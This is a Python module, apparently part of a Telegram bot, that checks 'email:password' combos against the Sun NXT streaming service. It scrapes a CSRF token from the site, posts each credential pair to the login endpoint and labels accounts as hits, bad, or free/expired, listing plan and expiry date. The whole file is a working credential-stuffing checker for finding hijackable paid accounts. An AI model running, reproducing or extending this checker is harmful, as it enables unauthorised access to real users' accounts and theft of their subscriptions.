import requests
from bs4 import BeautifulSoup
from bot.helper.message import Sendmessage, Editmessage
import json

head = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
}
# Grabbing Crsf token on recycling of heroku
req = requests.get("https://www.sunnxt.com/", headers=head)
soup = BeautifulSoup(req.content, "html.parser")
crsf_token = soup.find("meta", {"name": "csrf-token"})['content']


def Sun_helper(chat_id, combo):
    status = Sendmessage(chat_id, '<i>Checking...</i>')
    try:
        combo_split = combo.split(':')
        email = combo_split[0]
        password = combo_split[1]
    except IndexError:
        print(combo)
        Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
        return
    head["x-csrf-token"] = crsf_token
    head["x-requested-with"] = 'XMLHttpRequest'
    head["accept"] = "application/json, text/plain, */*"
    head["content-type"] = "application/json;charset=UTF-8"
    ipu_mail = f'"email": "{email}"'
    ipu_pass = f'"password": "{password}"'
    payload = '{%s,%s}' %(ipu_mail, ipu_pass)
    req2 = requests.post("https://www.sunnxt.com/login", headers=head, data=payload)
    resonse = req2.json()
    if req2.status_code != 200:
        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Error\nCode: {req2.status_code}\nMessage: {resonse["error"]}\nSite: Sun NXT</b>'
        Editmessage(chat_id, text, status)
        return
    profile = json.loads(resonse["profile"])
    pack_active = profile["result"]["profile"]["subscriptionStatus"]
    if pack_active == "Expired" or pack_active == "Inactive":
        free_text = f'<b>Free/Expired Combo ❌</b>\n<b>Site: Sun NXT</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: {pack_active}</b>'
        Editmessage(chat_id, free_text, status)
        return
    pack_name = resonse["userSubscriptions"]["results"][0]["displayName"]
    date = resonse["userSubscriptions"]["results"][0]["validityEndDate"]
    pro_message = f'<b>🌟 Hit Combo 💫</b>\n<b>Site: Sun NXT</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: {pack_active}\nPlan: {pack_name}\nExpire On: {date}</b>'
    Editmessage(chat_id, pro_message, status)
    return